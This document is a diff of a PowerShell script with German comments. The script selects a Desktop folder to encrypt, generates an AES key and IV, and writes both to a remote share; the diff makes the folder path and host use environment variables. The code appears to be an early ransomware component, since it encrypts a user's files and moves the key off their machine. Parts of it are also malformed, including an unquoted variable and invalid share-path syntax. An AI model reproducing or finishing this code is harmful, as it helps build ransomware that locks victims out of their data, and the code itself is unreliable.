@@ -1,8 +1,8 @@
 #wir stellen erstmal fest, welches Folder wir verschlüsseln..
 $username=$env:USERNAME
+$hostname=$env:COMPUTERNAME
 $folder=foo
-$folderPath = "C:\Users\Calculus\Desktop\foo"
-$hostname=mbgogo
+$folderPath = "C:\Users\$username\Desktop\$folder"
 $port=8080
 $encryptionKey = New-Object Byte[] 32  
 [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($encryptionKey)
@@ -17,8 +17,8 @@ $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
 $IV = $aesManaged.IV
 
 # encryption-key and IV speichern auf Webservern
-$keyFile = "\\hostname:port\sensible\encryptionKey.bin"
-$ivFile = "\\hostname:port\sensible\encryptionIV.bin"
+$keyFile = "\\$hostname:$port\sensible\encryptionKey.bin"
+$ivFile = "\\$hostname:$port\sensible\encryptionIV.bin"
 [System.IO.File]::WriteAllBytes($keyFile, $aesManaged.Key)
 [System.IO.File]::WriteAllBytes($ivFile, $aesManaged.IV)
 
